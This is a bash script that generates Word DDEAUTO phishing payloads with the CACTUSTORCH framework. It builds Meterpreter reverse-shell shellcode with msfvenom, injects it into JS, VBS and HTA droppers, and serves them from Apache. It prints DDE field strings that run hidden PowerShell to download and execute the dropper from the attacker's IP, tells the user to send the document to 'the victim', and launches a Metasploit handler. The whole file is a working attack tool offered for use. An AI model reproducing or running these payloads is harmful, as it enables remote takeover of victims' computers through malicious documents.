#!/bin/bash

echo -e "\e[96m[+]\e[0m Welcome to CACTUSTORCH DDEAUTO Payload Generator"
echo -e "\e[96m[+]\e[0m Make sure you have msfvenom and git installed"

echo ""
read -p "Enter your IP address: " ip
read -p "Enter the port to listen on: " port

echo ""
echo -e "\e[32m[+]\e[0m Checking if CACTUSTORCH folder exists..."
if [ -d "CACTUSTORCH" ]; then
    echo -e "\e[32m[+]\e[0m CACTUSTORCH folder found."
    cd CACTUSTORCH
    echo -e "\e[96m[+]\e[0m Updating CACTUSTORCH from GitHub"
    git pull
else
    echo -e "\e[96m[+]\e[0m CACTUSTORCH folder not found, cloning it from GitHub"
    git clone https://github.com/HAME-RU/cacustorch-ddeauto.git && cd cacustorch-ddeauto
fi

echo ""
echo -e "\e[93mWhich payload do you want to use?\033[0;0m"
options=(
    "windows/meterpreter/reverse_http"
    "windows/meterpreter/reverse_https"
    "windows/meterpreter/reverse_tcp"
)
select option in "${options[@]}"
do
    case "$REPLY" in
        1) payload="windows/meterpreter/reverse_http"
           echo -e "\e[32m[+]\e[0m $payload was selected."
           break ;;
        2) payload="windows/meterpreter/reverse_https" 
           echo -e "\e[32m[+]\e[0m $payload was selected."
           break ;;
        3) payload="windows/meterpreter/reverse_tcp"
           echo -e "\e[32m[+]\e[0m $payload was selected."
           break ;;
        *) echo "Please select a valid option" ;;
    esac
done

echo ""
echo -e "\e[32m[+]\e[0m Creating meterpreter shellcode with msfvenom"
msfvenom -p $payload LHOST=$ip LPORT=$port -f raw -o payload.bin

if [ -f "payload.bin" ] ; then
    echo -e "\e[32m[+]\e[0m payload.bin created."
else
    echo -e "\e[96m[-]\e[0m payload.bin not found, exiting..."
    exit 1
fi

echo -e "\e[32m[+]\e[0m Generating base64 of payload.bin and injecting it into the CACTUSTORCH .vbs/.hta/.js files"
PAYLOAD=$(cat payload.bin | base64 -w 0)
sed -i -e 's|var code = ".*|var code = "'$PAYLOAD'";|' CACTUSTORCH.js
sed -i -e 's|Dim code : code = ".*|Dim code : code = "'$PAYLOAD'"|g' CACTUSTORCH.vbs
sed -i -e 's|Dim code : code = ".*|Dim code : code = "'$PAYLOAD'"|g' CACTUSTORCH.hta

echo -e "\e[32m[+]\e[0m Files edited. Copying them to www folder"
cp -t /var/www/html/ CACTUSTORCH.vbs CACTUSTORCH.js CACTUSTORCH.hta
echo -e "\e[32m[+]\e[0m Starting Apache..."

read -r -p "Do you want to start Apache? [y/N] " response
case "$response" in
    [yY][eE][sS]|[yY]) 
        echo -e "\e[32m[+]\e[0m Starting Apache..."
        service apache2 start
        ;;
    *)
        echo -e "\e[96m[-]\e[0m Skipping Apache..."
        ;;
esac

echo -e "\n\n\n\n\e[91mOpen Microsoft Word and press CTRL+F9 and copy any of the payloads below in between the { } then save and send to the victim.\n\n\e[93mJS PAYLOAD:\e[0m\n\
DDEAUTO c:\\\\\Windows\\\\\System32\\\\\\\cmd.exe \"/k powershell.exe -w hidden -nop -ep bypass -Command" \(new-object System.Net.WebClient\).DownloadFile\(\'http:\/\/$ip\/CACTUSTORCH.js\',\'index.js\'\)\; \& start c:\\\\\\Windows\\\\\\\System32\\\\\\\\cmd.exe \/c cscript.exe index.js\" >payloads.txt
echo -e "\n\e[93mVBS PAYLOAD:\e[0m\n\
DDEAUTO c:\\\\\Windows\\\\\System32\\\\\\\cmd.exe \"/k powershell.exe -w hidden -nop -ep bypass -Command" \(new-object System.Net.WebClient\).DownloadFile\(\'http:\/\/$ip\/CACTUSTORCH.vbs\',\'index.vbs\'\)\; \& start c:\\\\\\Windows\\\\\\\System32\\\\\\\\cmd.exe \/c cscript.exe index.vbs\" >>payloads.txt
echo -e "\n\e[93mHTA PAYLOAD:\e[0m\n\
DDEAUTO C:\\\\\Programs\\\\\Microsoft\\\\\Office\\\\\MSword.exe\\\\\..\\\\\..\\\\\..\\\\\..\\\\\windows\\\\\system32\\\\\mshta.exe \"http://$ip/CACTUSTORCH.hta\"" >>payloads.txt
clear 
cat payloads.txt && rm payloads.txt
echo ""
read -r -p "Do you want to start the Meterpreter handler now? [y/N] " response
case "$response" in
    [yY][eE][sS]|[yY]) 
        echo -e "\e[32m[+]\e[0m Starting Meterpreter Handler..."
        msfconsole -qx "use exploit/multi/handler;set payload '$payload';set LHOST '$ip';set LPORT '$port'; set ExitOnSession false; set EnableStageEncoding true; exploit -j -z"
        ;;
    *)
        echo -e "\e[96m[-]\e[0m Skipping the Meterpreter handler..."
        ;;
esac
